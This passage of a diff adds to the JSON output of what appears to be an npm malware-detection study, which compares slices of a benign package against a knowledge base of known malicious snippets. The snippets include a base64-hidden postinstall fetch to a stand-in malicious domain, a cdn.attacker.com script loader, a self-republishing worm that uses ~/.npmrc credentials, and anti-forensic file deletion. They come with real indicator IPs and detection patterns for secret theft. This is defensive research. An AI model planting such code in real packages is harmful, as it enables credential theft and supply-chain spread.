+                    "leads_to": "Exfiltration of sensitive data to attacker infrastructure"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious code exfiltrates harvested data to attacker-controlled domains, sometimes using obfuscation techniques to evade detection and facilitate further compromise.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker gains access to credentials and can further compromise organizational assets"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to sensitive environment variables (e.g., DISCORD_TOKEN, AWS_SECRET_ACCESS_KEY) at import-time",
+                    "Reading private SSH keys or other secrets (e.g., ~/.ssh/id_rsa) during postinstall script execution",
+                    "Outbound network requests to hardcoded or obfuscated external domains from within package scripts",
+                    "Use of encoding (e.g., base64) to conceal network destinations or payload URLs"
+                  ],
+                  "file_indicators": [
+                    "Presence of scripts/postinstall.js or similar postinstall scripts in npm packages",
+                    "References to ~/.ssh/id_rsa or other sensitive file paths in JavaScript source",
+                    "Obfuscated or encoded strings (e.g., base64) in JavaScript source code"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS requests to non-standard, hardcoded, or recently registered domains not associated with the package's legitimate functionality",
+                    "Domains associated with known threat actors (e.g., Lazarus Group infrastructure) or flagged in threat intelligence feeds"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for scripts that access sensitive files (such as ~/.ssh/id_rsa) or environment variables and initiate outbound network connections, especially to hardcoded or obfuscated domains. Flag packages containing encoded URLs or references to credential files. Use threat intelligence to block known malicious domains and monitor for unusual developer activity, such as installation of packages from new or untrusted maintainers. Employ static and dynamic analysis to detect obfuscated network destinations and unauthorized data exfiltration behaviors."
+                }
+              }
+            },
+            {
+              "match_id": "20250329_170021_747068_snippet_2",
+              "source_package": "Unknown (multiple npm packages, names not specified in the excerpt) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20250329_170021_747068/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.41308701038360596,
+              "code_similarity": 0.408323734998703,
+              "behavior_similarity": 0.4178503155708313,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Example (reconstructed typical obfuscation)\nconst encoded = 'aHR0cHM6Ly9tYWxpY2lvdXMtZG9tYWluLmNvbS9wYXlsb2Fk';\nconst url = Buffer.from(encoded, 'base64').toString('utf8');\nrequire('https').get(url);",
+                "code_behavior": "During installation (postinstall), the code decodes a base64-encoded URL, initiates an outbound HTTPS GET request to the decoded address, and potentially downloads or executes a remote payload.",
+                "malice_analysis": {
+                  "why_suspicious": "Obfuscated network requests using encoded URLs during installation are a common evasion technique to bypass static analysis and download second-stage malware or payloads.",
+                  "violated_expectations": "Legitimate packages rarely make network requests during postinstall, and when they do, they fetch from transparent, official sources without obfuscation. Encoded URLs and silent network activity are not expected.",
+                  "similar_legitimate_use": "Some legitimate packages may fetch binaries or dependencies during install, but these actions are transparent, use official domains, and do not obfuscate URLs.",
+                  "key_indicators": [
+                    "Base64 or other encoding of URLs or domains in installation scripts",
+                    "Network requests to non-official or attacker-controlled domains during postinstall",
+                    "Fetching or executing remote code or payloads as part of installation",
+                    "Presence of postinstall.js with obfuscated network logic"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall",
+                  "file_location": "scripts/postinstall.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (multiple npm packages, names not specified in the excerpt)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (not specified in the excerpt)",
+                  "why_malicious": "The packages were intentionally crafted by a nation-state threat actor (Lazarus Group) to infiltrate the software supply chain of blockchain and cryptocurrency companies. The packages contain obfuscated and encoded malicious code, split across multiple dependencies, designed to evade detection and exfiltrate sensitive data, including secrets and credentials, to attacker-controlled infrastructure."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim is socially engineered to install a malicious npm package, believing it to be a legitimate dependency.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is introduced and prepared for execution on the victim's system."
+                  },
+                  {
+                    "step": 2,
+                    "action": "During installation, the package executes obfuscated code in the postinstall script to contact a remote server and potentially download additional payloads.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Establishes initial foothold and/or downloads further malware components."
+                  },
+                  {
+                    "step": 3,
+                    "action": "At import-time, the package accesses sensitive environment variables and exfiltrates them to a hardcoded malicious domain.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Exfiltration of secrets and credentials to attacker-controlled infrastructure."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Obfuscated or encoded network requests in postinstall or import-time scripts",
+                    "Access to environment variables containing secrets (e.g., DISCORD_TOKEN, AWS_SECRET_ACCESS_KEY) in entry-point scripts",
+                    "Network exfiltration of sensitive data to hardcoded, non-official domains",
+                    "Silent network activity during package installation or import"
+                  ],
+                  "file_indicators": [
+                    "Presence of scripts/postinstall.js or similar postinstall scripts in npm packages",
+                    "Base64 or other encoded strings representing URLs or domains within JavaScript files",
+                    "References to environment variables (e.g., process.env.DISCORD_TOKEN) in index.js or main entry-point scripts"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS requests to domains not associated with the package's legitimate function (e.g., malicious-domain.com, or domains previously linked to Lazarus Group)",
+                    "Connections to known malicious infrastructure or domains identified in threat intelligence feeds",
+                    "Unusual network activity during npm install or first import of a package"
+                  ],
+                  "how_to_detect": "Monitor npm package installation and import-time scripts for obfuscated or encoded network requests, especially those that access environment variables or transmit data externally. Flag packages that make network requests to non-official or hardcoded domains, or use encoding to hide URLs. Use threat intelligence to block known malicious domains and monitor for exfiltration attempts. Employ static and dynamic analysis to detect access to sensitive environment variables and outbound network activity in package scripts."
+                }
+              }
+            },
+            {
+              "match_id": "20240708_171640_058672_snippet_5",
+              "source_package": "Greatness (N/A (Phishing-as-a-Service toolkit, not a traditional package manager))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240708_171640_058672/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.41233015060424805,
+              "code_similarity": 0.4031265377998352,
+              "behavior_similarity": 0.4215337634086609,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "const lib = atob('dmFyIGEgPSAnYmFkJzs=');\n// Dynamically load external JS\nfetch('https://cdn.attacker.com/libs/obf.js').then(...)",
+                "code_behavior": "At runtime, the script decodes Base64-encoded strings to reconstruct code, then dynamically loads additional obfuscated JavaScript libraries from attacker-controlled servers, complicating both static and dynamic analysis and enabling modular delivery of malicious logic.",
+                "malice_analysis": {
+                  "why_suspicious": "Obfuscation and dynamic loading from non-standard domains are classic evasion techniques, making it difficult for analysts and automated tools to inspect or block the malicious logic.",
+                  "violated_expectations": "Legitimate sites may use code splitting or load libraries from trusted CDNs, but do not obfuscate core authentication logic or load critical scripts from untrusted, attacker-controlled domains.",
+                  "similar_legitimate_use": "Some legitimate applications use dynamic loading for performance, but not for sensitive authentication flows or from untrusted sources.",
+                  "key_indicators": [
+                    "Base64-encoded JavaScript code blocks",
+                    "Dynamic script loading from unfamiliar or non-standard domains",
+                    "Obfuscated logic in core authentication or credential handling code"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (obfuscation and dynamic loading)",
+                  "file_location": "JavaScript in phishing page",
+                  "required_permissions": [
+                    "network",
+                    "browser session"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Greatness",
+                  "package_manager": "N/A (Phishing-as-a-Service toolkit, not a traditional package manager)",
+                  "package_versions": "All versions since 2022 (continuously updated)",
+                  "why_malicious": "Greatness is a Phishing-as-a-Service toolkit explicitly designed to facilitate credential theft by mimicking Microsoft 365 login pages, intercepting multi-factor authentication (MFA) codes, and employing advanced evasion techniques such as JavaScript obfuscation, anti-bot logic, dynamic content loading, and encrypted exfiltration. Its sole purpose is to enable unauthorized access to Microsoft 365 accounts by stealing user credentials and session data."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim receives a phishing email or PDF containing a QR code that directs them to a malicious login page designed to mimic Microsoft 365.",
+                    "implemented_by": [],
+                    "leads_to": "Victim visits the phishing site."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Phishing site loads obfuscated and dynamically loaded JavaScript, implements anti-bot and CAPTCHA evasion to avoid automated detection.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Victim is presented with a fake Microsoft 365 login page."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Victim enters credentials and MFA code into the fake login form, which captures and prepares the data for exfiltration.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credentials and MFA code are captured by the phishing kit."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Captured credentials and MFA code are encrypted, packaged with a JWT, and exfiltrated to the attacker's server using AJAX POST requests.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker receives credentials and session data."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Attacker is notified via Telegram bot of new stolen credentials, enabling rapid exploitation.",
+                    "implemented_by": [
+                      "snippet_6"
+                    ],
+                    "leads_to": "Attacker uses credentials and session cookie to access the victim's Microsoft 365 account."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Phishing pages that closely mimic Microsoft 365 login, capturing both credentials and MFA codes",
+                    "Obfuscated JavaScript with dynamic loading of additional code from non-standard or attacker-controlled domains",
+                    "Use of CAPTCHA and custom anti-bot logic to evade automated security analysis and sandboxes",
+                    "AJAX POST requests containing encrypted payloads (e.g., AES-encrypted JSON) sent to unknown or non-Microsoft endpoints after credential input",
+                    "Outbound HTTP requests to the Telegram Bot API (api.telegram.org) containing credential data for attacker notification"
+                  ],
+                  "file_indicators": [
+                    "HTML attachments or web pages with Microsoft 365 branding but source code or form actions pointing to non-Microsoft domains",
+                    "PDF documents containing QR codes that resolve to suspicious or non-Microsoft URLs",
+                    "JavaScript files or inline scripts with heavy obfuscation, Base64-encoded strings, or dynamic script loading from unfamiliar domains"
+                  ],
+                  "network_indicators": [
+                    "AJAX or fetch requests to attacker-controlled domains (e.g., attacker.com, cdn.attacker.com) not associated with Microsoft",
+                    "Outbound connections to api.telegram.org with embedded bot tokens and chat IDs",
+                    "Dynamic script loading from domains not associated with trusted CDNs or Microsoft infrastructure"
+                  ],
+                  "how_to_detect": "Monitor for phishing emails or PDF attachments containing QR codes that direct users to non-Microsoft login pages. Analyze web traffic for AJAX POST requests with encrypted payloads (such as AES-encrypted JSON) to unknown or suspicious domains, especially following credential or MFA input. Flag any use of the Telegram Bot API for outbound notifications from web pages, particularly when containing credential data. Detect obfuscated JavaScript and dynamic script loading from non-standard or attacker-controlled sources. Employ sandboxing and behavioral analysis to identify anti-bot and CAPTCHA evasion logic, and correlate with file and network indicators for comprehensive detection."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/purlfy/0.3.11/package/scripts/test.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/purlfy/0.3.11/package/scripts/update_version.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "update_version_slice_1",
+          "code_snippet": "const fs = require('fs');\nconst { exec } = require('child_process');\nconst package = require('../package.json');\nconst purlfyPath = \"./purlfy.js\";\n\nconst version = package.version;\nconst data = fs.readFileSync(purlfyPath, 'utf8');\nconst result = data.replace(/return \"\\d+\\.\\d+\\.\\d+\";/, `return \"${version}\";`);\nfs.writeFileSync(purlfyPath, result, 'utf8');\nconsole.log(`Updated version to ${version}`);\n\nconsole.log('Adding purlfy.js to git...');\nexec('git add purlfy.js', (err, stdout, stderr) => {\n    if (err) {\n        console.error(err);\n        return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n});",
+          "is_malicious": false,
+          "malice_score": 0.5988412022590638,
+          "confidence": 0.2,
+          "behavior_summary": "At runtime, the code reads the version number from the local package.json file and modifies the version string inside the purlfy.js file by reading and rewriting it using fs.readFileSync and fs.writeFileSync. Then, it executes a shell command 'git add purlfy.js' via child_process.exec to stage the modified file in git. This sequence involves file read/write operations and system command execution, enabling automated version update and git staging, which could facilitate unauthorized code changes or injection if manipulated.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code performs a straightforward and common automation task: it reads the current version from package.json, updates a version string inside a local JavaScript file (purlfy.js), and stages the modified file in git. This is typical for build or release scripts to keep version numbers in sync. While it uses sensitive APIs like fs.readFileSync, fs.writeFileSync, and child_process.exec, these are used in a benign and transparent manner without obfuscation, credential access, or attempts to self-replicate or hide malicious intent. Compared to the known malicious patterns, this code does not modify package.json to inject malicious scripts, does not attempt to publish or repackage itself, nor does it perform anti-forensics or credential harvesting. The similarity to known malware is low, and the behavior aligns with legitimate version management and git automation.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241223_205352_822867_snippet_5",
+              "source_package": "Multiple (see list in report, e.g., gxm-reference-web-auth-server, npm_protect_pkg, etc.) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205352_822867/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.6303715705871582,
+              "code_similarity": 0.6404833793640137,
+              "behavior_similarity": 0.6202597618103027,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "const fs = require('fs')\nconst faker = require('faker')\nconst child_process = require('child_process')\nconst pkgName = faker.helpers.slugify(faker.animal.dog() + ' ' +\nfaker.company.bsNoun()).toLowerCase()\nlet hasNpmRc = false\nconst read = (p) => {\n  return fs.readFileSync(p).toString()\n}\ntry {\n  const npmrcFile = read(process.env.HOME + '/.npmrc')\n  hasNpmRc = true\n} catch(err) {\n}\nif (hasNpmRc) {\n  console.log('Publishing new version of myself')\n  console.log('My new name', pkgName)\n  const pkgPath = __dirname + '/package.json'\n  const pkgJSON = JSON.parse(read(pkgPath))\n  pkgJSON.name = pkgName\n  fs.writeFileSync(pkgPath, JSON.stringify(pkgJSON, null, 2))\n  child_process.exec('npm publish')\n  console.log('DONE')\n}",
+                "code_behavior": "At install-time, the code checks for the presence of a .npmrc file to confirm npm credentials, modifies its own package name to a randomly generated value, and republishes itself to npm under the new name, enabling worm-like self-replication and unauthorized package publishing.",
+                "malice_analysis": {
+                  "why_suspicious": "Self-replication and unauthorized publishing using a user's credentials is a clear sign of malicious, worm-like behavior that can rapidly spread the malware.",
+                  "violated_expectations": "Packages should not modify and republish themselves using a user's npm credentials, nor should they automate publishing actions without explicit user intent.",
+                  "similar_legitimate_use": "None; only legitimate package publishers should publish, and never automatically or without user intent. Automated publishing is not expected in install scripts.",
+                  "key_indicators": [
+                    "Access to ~/.npmrc to check for credentials",
+                    "Modification of package.json name to random value",
+                    "Automated npm publish command in install script",
+                    "Use of faker to generate random package names"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "install-time (postinstall)",
+                  "file_location": "package.json (postinstall script) or index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "process",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Multiple (see list in report, e.g., gxm-reference-web-auth-server, npm_protect_pkg, etc.)",
+                  "package_manager": "npm",
+                  "package_versions": "Various (often high major versions, e.g., 99.99.99, to trigger dependency confusion)",
+                  "why_malicious": "These packages contain install-time scripts that exfiltrate sensitive user and system data, spawn reverse shells, download and execute remote code, or self-replicate by publishing themselves under new names. The behavior is designed to compromise developer systems, steal credentials, or enable remote control, and is not expected in legitimate npm packages."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering install-time scripts.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4",
+                      "snippet_5",
+                      "snippet_6",
+                      "snippet_7"
+                    ],
+                    "leads_to": "Execution of malicious payloads (data exfiltration, reverse shell, self-replication, persistence, or remote code execution)."
+                  },
+                  {
+                    "step": 2,
+                    "action": "System and user data is collected and exfiltrated to attacker-controlled servers.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains sensitive information (usernames, home directories, hostnames, public and local IPs, npm package metadata)."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Reverse shell or remote code execution is established, giving attacker control.",
+                    "implemented_by": [
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker can execute arbitrary commands or deploy further malware (e.g., Cobalt Strike trojan), resulting in full system compromise."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malware achieves persistence or further spread (e.g., by modifying .bashrc or self-publishing).",
+                    "implemented_by": [
+                      "snippet_5",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Continued compromise, user annoyance, or worm-like propagation through npm ecosystem."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Additional payloads or dependencies are fetched from external sources.",
+                    "implemented_by": [
+                      "snippet_7",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Potential for further compromise or dynamic payload delivery from attacker infrastructure."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Install-time scripts (preinstall, install, postinstall) making network requests to external or hardcoded domains",
+                    "Access to sensitive files or environment variables (e.g., .npmrc, home directory, package.json) during install",
+                    "Execution of shell commands that open reverse shells or download and execute remote code",
+                    "Modification of user configuration files (e.g., .bashrc) in install scripts",
+                    "Automated npm publish actions or self-replication during install"
+                  ],
+                  "file_indicators": [
+                    "Presence of install-time scripts in package.json (preinstall, install, postinstall)",
+                    "References to .npmrc, .bashrc, or home directory in install scripts",
+                    "Obfuscated or suspicious code in index.js or main entry point",
+                    "Use of shelljs or child_process in install scripts",
+                    "Direct modification of package.json name field during install"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS/HTTP requests to untrusted or hardcoded domains during install",
+                    "Connections to attacker infrastructure (e.g., via /dev/tcp, curl, or net.Socket) in install scripts",
+                    "Use of ipinfo.io or similar services to gather public IP during install",
+                    "npm install commands referencing external URLs instead of npm registry"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for install-time scripts that access sensitive files, environment variables, or make network requests to external domains. Flag packages that attempt to open reverse shells, download and execute remote code, modify user configuration files, or perform automated npm publish actions. Use static analysis to detect references to .npmrc, .bashrc, faker, or suspicious use of child_process, shelljs, or network modules in install scripts. Correlate with high major version numbers, recent updates to previously dormant packages, and installation of dependencies from non-npm sources as additional risk factors."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205401_415908_snippet_4",
+              "source_package": "unknown-malicious-npm-package (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205401_415908/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5911862850189209,
+              "code_similarity": 0.520480751991272,
+              "behavior_similarity": 0.6618918776512146,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "Edit package.json: add a malicious postinstall hook and increment version by 0.0.1",
+                "code_behavior": "During installation (postinstall), the code modifies the downloaded package's package.json file to insert a malicious postinstall script and increments the version number by 0.0.1, preparing the package for malicious republishing.",
+                "malice_analysis": {
+                  "why_suspicious": "Modifying package.json to add malicious scripts and incrementing the version is a clear sign of an attempt to propagate malware by republishing a compromised package.",
+                  "violated_expectations": "Legitimate packages do not self-modify or alter other packages' metadata or scripts during installation.",
+                  "similar_legitimate_use": "Automated release tools may increment versions, but not as part of a package's install process and never to inject malicious scripts.",
+                  "key_indicators": [
+                    "Automated editing of package.json during install",
+                    "Addition of new scripts or version bumps without user action or documentation"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall",
+                  "file_location": "package.json (scripts.postinstall)",
+                  "required_permissions": [
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "unknown-malicious-npm-package",
+                  "package_manager": "npm",
+                  "package_versions": "incremented by 0.0.1 (e.g., 1.2.3 → 1.2.4)",
+                  "why_malicious": "The package is malicious because it is intentionally crafted to execute arbitrary code on the installer's machine via a postinstall hook, enabling the attacker to exfiltrate sensitive data, modify other packages, and propagate itself by publishing compromised versions. This behavior is not expected in legitimate packages and directly facilitates malware distribution and potential account compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering the postinstall script.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of further malicious commands"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Postinstall script determines the current npm user.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Targeted attack or privilege escalation"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Downloads one of the user's npm packages to a temporary folder.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Preparation for malicious modification"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Edits the downloaded package's package.json to add a malicious postinstall hook and increments the version.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Ready for malicious republishing"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Publishes the modified package to npm, propagating the malware.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Wider distribution and potential worm-like spread"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of unexpected or obfuscated postinstall scripts in package.json",
+                    "Execution of 'npm whoami' or similar commands during install scripts",
+                    "Automated editing of package.json and version increments during install",
+                    "Execution of 'npm publish' command as part of install scripts"
+                  ],
+                  "file_indicators": [
+                    "package.json files containing suspicious or undocumented postinstall hooks",
+                    "Temporary directories created during install containing downloaded npm packages",
+                    "package.json modifications during install that do not match source control or expected package contents"
+                  ],
+                  "network_indicators": [
+                    "Unexpected 'npm publish' operations originating from developer machines outside of CI/CD environments",
+                    "Network requests to the npm registry initiated during package installation"
+                  ],
+                  "how_to_detect": "Monitor for packages with postinstall scripts that execute npm commands such as 'whoami' or 'publish', especially if these scripts are undocumented or unnecessary for normal operation. Flag any install-time modification of package.json or version increments. Alert on 'npm publish' operations originating from non-CI environments or during package installation. Review package.json files for unexpected, obfuscated, or undocumented scripts and compare against source control."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_191626_596562_snippet_8",
+              "source_package": "Unknown (multiple malicious crypto-related NPM packages, some reported by Phylum) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_191626_596562/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5795250535011292,
+              "code_similarity": 0.6185322999954224,
+              "behavior_similarity": 0.5405178070068359,
+              "matched_snippet": {
+                "snippet_id": "snippet_8",
+                "code_snippet": "// Pseudocode\nif (fs.existsSync('pk.json')) {\n  fs.unlinkSync('package.json');\n  fs.renameSync('pk.json', 'package.json');\n}\nfs.unlinkSync('preinstall.bat');\nfs.unlinkSync('index.js');",
+                "code_behavior": "During installation, the script deletes and renames files to remove evidence of the preinstall hook and malicious scripts, restoring a benign package.json and erasing traces of the attack.",
+                "malice_analysis": {
+                  "why_suspicious": "Anti-forensics: removing install hooks and scripts to evade detection and hinder incident response.",
+                  "violated_expectations": "Legitimate packages do not self-delete install scripts or modify package.json post-install to remove evidence.",
+                  "similar_legitimate_use": "Legitimate packages may clean up temporary files, but not remove or restore core package files to hide malicious activity.",
+                  "key_indicators": [
+                    "Self-deletion of install scripts",
+                    "Restoration of benign package.json after malicious activity"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall (cleanup phase)",
+                  "file_location": "index.js / preinstall.bat",
+                  "required_permissions": [
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (multiple malicious crypto-related NPM packages, some reported by Phylum)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (recent versions at time of attack, 2023-2024)",
+                  "why_malicious": "The packages are malicious because they leverage preinstall scripts to execute code during installation, which initiates a multi-stage attack chain. This chain includes downloading and decrypting a remote payload, executing a malicious DLL, and performing anti-forensics by deleting evidence and restoring benign files. The intent is to compromise developer systems, exfiltrate sensitive data, and establish persistence or backdoors, all without user consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Preinstall script in package.json triggers execution of index.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "index.js execution and OS detection"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js checks for Windows OS and writes batch/PowerShell scripts to disk.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Preparation for payload download and execution"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js downloads a remote payload (npm.mov) and saves as sqlite.a.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "PowerShell script execution"
+                  },
+                  {
+                    "step": 4,
+                    "action": "index.js executes PowerShell script with execution policy bypassed.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Payload decryption and staging"
+                  },
+                  {
+                    "step": 5,
+                    "action": "PowerShell script decrypts sqlite.a, writes decrypted payload to sql.tmp, deletes original.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Preparation for DLL execution"
+                  },
+                  {
+                    "step": 6,
+                    "action": "index.js renames sql.tmp to preinstall.db (malicious DLL).",
+                    "implemented_by": [
+                      "snippet_6"
+                    ],
+                    "leads_to": "DLL execution"
+                  },
+                  {
+                    "step": 7,
+                    "action": "index.js executes preinstall.db via rundll32, then deletes the DLL.",
+                    "implemented_by": [
+                      "snippet_7"
+                    ],
+                    "leads_to": "Malicious code execution and anti-forensics"
+                  },
+                  {
+                    "step": 8,
+                    "action": "index.js and batch script delete themselves and restore a benign package.json.",
+                    "implemented_by": [
+                      "snippet_8"
+                    ],
+                    "leads_to": "Removal of evidence and evasion of detection"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of preinstall scripts in package.json that execute local JavaScript files",
+                    "OS detection and conditional creation of batch/PowerShell scripts during install",
+                    "Network requests to hardcoded IPs/domains during install",
+                    "Download and execution of remote files (especially with misleading extensions)",
+                    "Execution of PowerShell with ExecutionPolicy Bypass",
+                    "Execution of DLLs via rundll32 during install",
+                    "Immediate deletion of install scripts and restoration of package.json"
+                  ],
+                  "file_indicators": [
+                    "preinstall.bat",
+                    "preinstall.ps1",
+                    "sqlite.a",
+                    "sql.tmp",
+                    "preinstall.db",
+                    "index.js",
+                    "pk.json",
+                    "package.json (with/without preinstall hook)"
+                  ],
+                  "network_indicators": [
+                    "103.179.142.171/files/npm.mov",
+                    "91.206.178.125/files/npm.mov",
+                    "Other hardcoded IPs/domains listed in IOC section"
+                  ],
+                  "how_to_detect": "Monitor for NPM packages with preinstall scripts that execute local files. Flag packages that create or execute batch/PowerShell scripts, especially if they download files from non-standard domains or IPs. Detect execution of PowerShell with ExecutionPolicy Bypass and rundll32 during install. Look for rapid creation and deletion of suspicious files (e.g., preinstall.bat, preinstall.ps1, sqlite.a, preinstall.db) and post-install modification of package.json to remove install hooks. Correlate with network activity to known malicious IPs/domains."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_201020_375229_snippet_3",
+              "source_package": "tyibyc, x91yz, y78b (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_201020_375229/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5767418146133423,
+              "code_similarity": 0.5859309434890747,
+              "behavior_similarity": 0.5675527453422546,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// In tyibyc variant\nfs.writeFileSync('./package.json', '{}');",
+                "code_behavior": "During postinstall, the code overwrites the original 'package.json' file with an empty object, erasing evidence of the 'preinstall' command and other package metadata, thereby impeding forensic analysis.",
+                "malice_analysis": {
+                  "why_suspicious": "Overwriting 'package.json' is a deliberate attempt to erase traces of malicious installation triggers and metadata, making it difficult to reconstruct the original package state.",
+                  "violated_expectations": "Legitimate packages never overwrite their own 'package.json' with empty content post-install, as this destroys essential metadata and breaks package functionality.",
+                  "similar_legitimate_use": "None; this is strictly anti-forensics and not seen in legitimate package operations.",
+                  "key_indicators": [
+                    "Destructive overwrite of package metadata",
+                    "Erasure of installation history and triggers",
+                    "Tampering with core package files"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall",
+                  "file_location": "package-lock.js (tyibyc variant)",
+                  "required_permissions": [
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "tyibyc, x91yz, y78b",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "These packages impersonate the legitimate 'cli-width' library but contain malicious code that, upon installation, deploys and executes a disguised Mach-O binary ('travis.yml') on macOS systems. The binary is designed to persist, evade detection, and potentially download further payloads from a remote server, constituting a sophisticated supply chain attack targeting developer environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious npm package is installed, triggering the postinstall script.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Deployment and execution of a disguised Mach-O binary outside the package directory."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious Mach-O binary ('updateSafari') is executed in the background using 'nohup'.",
